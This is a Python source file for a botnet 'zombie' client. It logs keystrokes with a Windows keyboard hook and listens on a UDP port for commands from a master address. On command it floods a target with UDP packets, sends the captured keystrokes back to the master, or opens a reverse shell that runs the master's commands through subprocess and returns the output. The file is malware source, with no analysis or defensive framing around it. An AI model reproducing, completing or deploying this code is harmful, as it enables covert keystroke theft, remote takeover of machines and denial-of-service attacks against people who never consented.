import sys
import socket
import subprocess
import pyHook, pythoncom, sys, logging
import time


MASTER_IP = "127.0.0.1"
MASTER_PORT = 6000
ZOMB_PORT = int(sys.argv[1])


file_log = 'l.txt'

def OnKeyboardEvent(event):
    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
    chr(event.Ascii)
    logging.log(10,chr(event.Ascii))
    return True


class Zombie:

	def __init__(self,conn):
		self.conn = conn


	#Denial of Service Attack
	def dos(self,dest_ip,dest_port):

		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)		#Create socket
			print "dos connected..."
		except socket.error, msg :
			print 'Failed. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
			return

		print "starting dos..."
		for i in xrange(10):
			sock.sendto("SPAM",(dest_ip,dest_port))						#Send packets

		sock.sendto("dos finished...",(MASTER_IP,MASTER_PORT)) 
		sock.close()													#Close socket

	#Reverse Shell
	def reverse_shell(self):

		print "Starting reverse shell...\n"

		while True:
			cmd = self.conn.recv(1024)				#Receive shell command
			print cmd
			if cmd == 'exit':					#Break if user wished to exit
				print "Exiting...\n"
				break

			# do shell command
			new_process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			# read output
			stdout_value = new_process.stdout.read() + new_process.stderr.read()
			# send back output
			self.conn.sendto(stdout_value,(MASTER_IP,MASTER_PORT))

	#Keylog for a time period and send data back to master
	def keylog(self,time):

		start = time.time()
		while time.time() - start < time:
			pythoncom.PumpWaitingMessages()

		f = open(file_log,'r')
		data = f.read()
		self.conn.sendto("Keylog data",(MASTER_IP,MASTER_PORT))
		self.conn.sendto(data,(MASTER_IP,MASTER_PORT))
		f.close()

	#Parse masters command
	def parse_cmd(self,p):
		# packet = conn.recv(1024)
		packet = p.split(';')

		#packet = "DDOS;DEST_IP;DEST_PORT"
		if packet[0] == "DDOS":
			self.dos(packet[1],int(packet[2]))

		#packet = "KEYL;TIME"
		#TIME is in seconds
		elif packet[0] == "KEYL":
			self.keylog(int(packet[1]))

		#packet  = "RVSH"
		elif packet[0] == "RVSH":
			self.conn.sendto("RVSH",(MASTER_IP,MASTER_PORT))				#Tell master to start sending commands
			self.reverse_shell()


		# conn.close()



if __name__ == '__main__':


	try:
		# s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)		#Create socket
		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)		#Create socket
		s.bind(('',ZOMB_PORT))								#Bind to port
		# s.listen(3)													#Listen 
		print 'Socket created'
	except socket.error, msg :
		print 'Failed. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
		sys.exit()

	
	zomb = Zombie(s)
	hooks_manager = pyHook.HookManager()
	hooks_manager.KeyDown = OnKeyboardEvent
	hooks_manager.HookKeyboard()

	while True:
		#Receive command
		data, addr = zomb.conn.recvfrom(1024)
		print "reveived: " + data + " from: " + addr[0] + " " + str(addr[1])
		# conn, addr = s.accept()
		if addr[0] == MASTER_IP:
			#start new thread takes 1st argument as a function name to be run, second is the tuple of arguments to the function.
			# start_new_thread(zomb.parse_cmd ,(conn,))
			# start_new_thread(zomb.parse_cmd ,(data,))
			print "Parsing..."
			zomb.parse_cmd(data)
		# else:
		# 	conn.close()


	zomb.conn.close()
